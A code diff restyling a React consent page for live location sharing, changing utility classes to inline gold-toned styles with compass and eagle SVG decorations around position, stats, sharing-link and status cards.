-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(120,83,0,0.28)", border: "1px solid rgba(217,119,6,0.35)" }}>
-                <Users className="h-4 w-4 text-amber-400 flex-shrink-0" />
-                <p className="text-[13px] font-semibold text-amber-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e2008 0%,#3e2e10 100%)", border: "1.5px solid #8B6914", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <Users style={{ width: 18, height: 18, color: "#D4A843", flexShrink: 0 }} />
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>
                   {contactsCollectedCountRef.current} priority responder linkage{contactsCollectedCountRef.current !== 1 ? "s" : ""} established ✓
                 </p>
               </div>
             )}
           </div>
 
-          {/* ── Current position ─────────────────────────────────────────────── */}
+          {/* ── Current Position — stone slate card with compass roses ── */}
           {coords && (
-            <div className="rounded-xl p-4" style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
-              <div className="flex items-center gap-2 mb-3">
-                <Navigation className="h-4 w-4 text-white/50 flex-shrink-0" />
-                <span className="text-[11px] font-bold text-white/40 uppercase tracking-widest">Current Position</span>
+            <div style={{ borderRadius: 8, padding: "14px 14px", background: "linear-gradient(135deg,#1e1a10 0%,#2a2416 60%,#1a1608 100%)", border: "1.5px solid #5a4f38", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.06), 0 4px 14px rgba(0,0,0,0.55)" }}>
+              {/* Header row with compass roses */}
+              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
+                {/* Left compass */}
+                <svg width="24" height="24" viewBox="0 0 32 32" fill="none" style={{ opacity: 0.7 }}>
+                  <circle cx="16" cy="16" r="14" stroke="#8B6914" strokeWidth="1" fill="none"/>
+                  <polygon points="16,2 18,14 16,12 14,14" fill="#C8922A"/>
+                  <polygon points="16,30 14,18 16,20 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <polygon points="2,16 14,18 12,16 14,14" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <polygon points="30,16 18,14 20,16 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <circle cx="16" cy="16" r="2.5" fill="#8B6914"/>
+                  <circle cx="16" cy="16" r="1.2" fill="#D4A843"/>
+                </svg>
+                <div style={{ flex: 1, textAlign: "center" }}>
+                  <span style={{ fontSize: 10, fontWeight: 700, color: "rgba(212,168,67,0.55)", letterSpacing: "0.14em", fontFamily: "'Share Tech Mono', monospace" }}>CURRENT POSITION</span>
+                </div>
+                {/* Right compass */}
+                <svg width="24" height="24" viewBox="0 0 32 32" fill="none" style={{ opacity: 0.7 }}>
+                  <circle cx="16" cy="16" r="14" stroke="#8B6914" strokeWidth="1" fill="none"/>
+                  <polygon points="16,2 18,14 16,12 14,14" fill="#C8922A"/>
+                  <polygon points="16,30 14,18 16,20 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <polygon points="2,16 14,18 12,16 14,14" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <polygon points="30,16 18,14 20,16 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
+                  <circle cx="16" cy="16" r="2.5" fill="#8B6914"/>
+                  <circle cx="16" cy="16" r="1.2" fill="#D4A843"/>
+                </svg>
               </div>
-              <p className="text-xl font-mono font-bold text-white leading-snug">
+              <p style={{ fontSize: 22, fontFamily: "'Share Tech Mono', monospace", fontWeight: 700, color: "#E5C88A", lineHeight: 1.25, margin: "0 0 4px" }}>
                 {formatDMS(coords.lat, coords.lng)}
               </p>
-              <p className="text-xs font-mono text-white/45 mt-0.5">
+              <p style={{ fontSize: 12, fontFamily: "'Share Tech Mono', monospace", color: "rgba(212,168,67,0.5)", margin: "0 0 6px" }}>
                 {coords.lat.toFixed(6)},&nbsp;&nbsp;{coords.lng.toFixed(6)}
               </p>
               {coords.accuracy && (
-                <p className="text-xs text-white/40 mt-1.5">Accuracy: ±{Math.round(coords.accuracy)}m</p>
+                <p style={{ fontSize: 12, color: "rgba(180,150,80,0.5)", margin: "0 0 2px", fontFamily: "'Share Tech Mono', monospace" }}>Accuracy: ±{Math.round(coords.accuracy)}m</p>
               )}
               {address && (
-                <p className="text-xs text-white/40 mt-1 leading-relaxed">
+                <p style={{ fontSize: 12, color: "rgba(180,150,80,0.45)", margin: 0, lineHeight: 1.45 }}>
                   {address.slice(0, 80)}{address.length > 80 ? "…" : ""}
                 </p>
               )}
             </div>
           )}
 
-          {/* ── Stats ────────────────────────────────────────────────────────── */}
-          <div className="grid grid-cols-2 gap-3">
-            <div className="rounded-xl p-4 text-center" style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
-              <p className="text-2xl font-bold text-white">{updateCount}</p>
-              <p className="text-xs text-white/40 mt-0.5">Updates sent</p>
+          {/* ── Stats grid ── */}
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
+            <div style={{ borderRadius: 8, padding: "14px 12px", textAlign: "center", background: "linear-gradient(135deg,#3a2810 0%,#4a3418 60%,#3a2810 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.08), 0 3px 10px rgba(0,0,0,0.5)" }}>
+              <p style={{ fontSize: 28, fontWeight: 800, color: "#E5C88A", margin: "0 0 2px", fontFamily: "'Share Tech Mono', monospace" }}>{updateCount}</p>
+              <p style={{ fontSize: 11, color: "rgba(212,168,67,0.5)", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>Updates sent</p>
             </div>
-            <div className="rounded-xl p-4 text-center" style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
-              <p className="text-sm font-bold text-white">
+            <div style={{ borderRadius: 8, padding: "14px 12px", textAlign: "center", background: "linear-gradient(135deg,#3a2810 0%,#4a3418 60%,#3a2810 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.08), 0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
+              {/* Eagle eye watermark */}
+              <div style={{ position: "absolute", bottom: -4, right: -4, opacity: 0.18 }}>
+                <svg width="44" height="44" viewBox="0 0 40 44" fill="none">
+                  <polygon points="16,4 26,6 28,18 22,22 14,16" fill="#C8922A" stroke="#C8922A" strokeWidth="0.5"/>
+                  <polygon points="26,6 34,10 32,22 26,26 28,18" fill="#8B6914" stroke="#C8922A" strokeWidth="0.5"/>
+                  <polygon points="14,16 22,22 20,32 12,30 10,22" fill="#C8922A" stroke="#C8922A" strokeWidth="0.5"/>
+                  <polygon points="10,22 14,28 8,30 4,24" fill="#D4A843" stroke="#C8922A" strokeWidth="0.5"/>
+                  <circle cx="24" cy="11" r="3.5" fill="#D4A843" opacity="0.8"/>
+                  <circle cx="24" cy="11" r="1.5" fill="#FFF0C0"/>
+                </svg>
+              </div>
+              <p style={{ fontSize: 18, fontWeight: 700, color: "#E5C88A", margin: "0 0 2px", fontFamily: "'Share Tech Mono', monospace" }}>
                 {lastSent ? lastSent.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "—"}
               </p>
-              <p className="text-xs text-white/40 mt-0.5">Last update</p>
+              <p style={{ fontSize: 11, color: "rgba(212,168,67,0.5)", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>Last update</p>
             </div>
           </div>
 
-          {/* ── 60-day sharing link ───────────────────────────────────────────── */}
-          <div className="rounded-xl p-4" style={{ background: "rgba(99,102,241,0.08)", border: "1px solid rgba(99,102,241,0.22)" }}>
-            <div className="flex items-center gap-2 mb-2">
-              <Share2 className="h-4 w-4 text-indigo-400 flex-shrink-0" />
-              <p className="text-xs font-bold text-indigo-400 tracking-wide">60-Day Sharing Link</p>
+          {/* ── 60-day sharing link ── */}
+          <div style={{ borderRadius: 8, padding: "14px", background: "linear-gradient(135deg,#2a1e08 0%,#3a2c10 100%)", border: "1.5px solid #6b5020" }}>
+            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
+              <Share2 style={{ width: 14, height: 14, color: "#C8922A", flexShrink: 0 }} />
+              <p style={{ fontSize: 11, fontWeight: 700, color: "#C8922A", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>60-DAY SHARING LINK</p>
             </div>
-            <p className="text-xs text-white/40 mb-3 leading-relaxed">
-              This link keeps sharing active until{" "}
-              <strong className="text-white/65">
+            <p style={{ fontSize: 12, color: "rgba(180,150,80,0.55)", marginBottom: 10, lineHeight: 1.5 }}>
+              Active until{" "}
+              <strong style={{ color: "rgba(212,168,67,0.75)" }}>
                 {expiresAt.toLocaleDateString(undefined, { month: "short", day: "numeric", year: "numeric" })}
-              </strong>. Open it anytime to reconnect.
+              </strong>. Open anytime to reconnect.
             </p>
-            <div className="flex gap-2">
-              <div className="flex-1 min-w-0 rounded-lg px-3 py-2 text-xs font-mono text-white/40 truncate"
-                style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,255,255,0.08)" }}>
+            <div style={{ display: "flex", gap: 8 }}>
+              <div style={{ flex: 1, minWidth: 0, borderRadius: 6, padding: "8px 10px", fontSize: 11, fontFamily: "'Share Tech Mono', monospace", color: "rgba(212,168,67,0.4)", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", background: "rgba(0,0,0,0.35)", border: "1px solid rgba(122,92,40,0.3)" }}>
                 {sharingLink}
               </div>
               <button
                 onClick={handleCopyLink}
-                className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold transition-all"
-                style={linkCopied
-                  ? { background: "rgba(16,185,129,.18)", border: "1px solid rgba(16,185,129,.35)", color: "#6ee7b7" }
-                  : { background: "rgba(99,102,241,.18)", border: "1px solid rgba(99,102,241,.35)", color: "#a5b4fc" }}
+                style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderRadius: 6, fontSize: 12, fontWeight: 600, border: "none", cursor: "pointer", fontFamily: "'Share Tech Mono', monospace", letterSpacing: "0.04em",
+                  ...(linkCopied
+                    ? { background: "rgba(16,130,60,0.2)", border: "1px solid rgba(16,185,129,0.35)", color: "#6ee7b7" }
+                    : { background: "linear-gradient(135deg,#8B6914,#C8922A)", color: "#1a0c05" }) }}
               >
-                {linkCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
+                {linkCopied ? <Check style={{ width: 13, height: 13 }} /> : <Copy style={{ width: 13, height: 13 }} />}
                 {linkCopied ? "Copied!" : "Copy"}
               </button>
             </div>
           </div>
 
-          {/* ── Live-sharing active notice ────────────────────────────────────── */}
-          <div className="rounded-xl p-4" style={{ background: "rgba(16,185,129,0.08)", border: "1px solid rgba(16,185,129,0.2)" }}>
-            <div className="flex items-center gap-2 mb-1">
-              <CheckCircle className="h-4 w-4 text-emerald-400 flex-shrink-0" />
-              <p className="text-xs font-bold text-emerald-400">Live sharing is active</p>
+          {/* ── Live sharing active notice ── */}
+          <div style={{ borderRadius: 8, padding: "12px 14px", background: "linear-gradient(135deg,#0e2010 0%,#142816 100%)", border: "1.5px solid rgba(34,150,80,0.28)" }}>
+            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
+              <CheckCircle style={{ width: 14, height: 14, color: "#4ade80", flexShrink: 0 }} />
+              <p style={{ fontSize: 11, fontWeight: 700, color: "#4ade80", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>LIVE SHARING ACTIVE</p>
             </div>
-            <p className="text-xs text-white/40 leading-relaxed">
+            <p style={{ fontSize: 12, color: "rgba(180,220,180,0.45)", margin: 0, lineHeight: 1.5 }}>
               You can close this app and remove your browser from recent apps — sharing automatically reconnects the next time you open the link.
             </p>
           </div>
 
+          {/* ── Go back ── */}
           <button
-            className="w-full rounded-xl py-3 text-sm font-semibold text-white/50 flex items-center justify-center gap-2 transition-colors active:text-white/80"
-            style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.09)" }}
+            style={{ width: "100%", borderRadius: 8, padding: "12px", fontSize: 13, fontWeight: 600, color: "rgba(212,168,67,0.4)", display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "rgba(122,92,40,0.08)", border: "1.5px solid rgba(122,92,40,0.2)", cursor: "pointer", fontFamily: "Georgia, serif", letterSpacing: "0.04em" }}
             onClick={() => {
               if (window.history.length > 1) { window.history.back(); } else {
                 const a = document.createElement("a"); a.href = "whatsapp://"; a.style.cssText = "position:fixed;top:-9999px";
@@ -2575,7 +2610,7 @@ export default function ConsentPage() {
               }
             }}
           >
-            <ArrowLeft className="h-4 w-4" /> Go Back
+            <ArrowLeft style={{ width: 16, height: 16 }} /> Go Back
           </button>
         </div>
       </div>
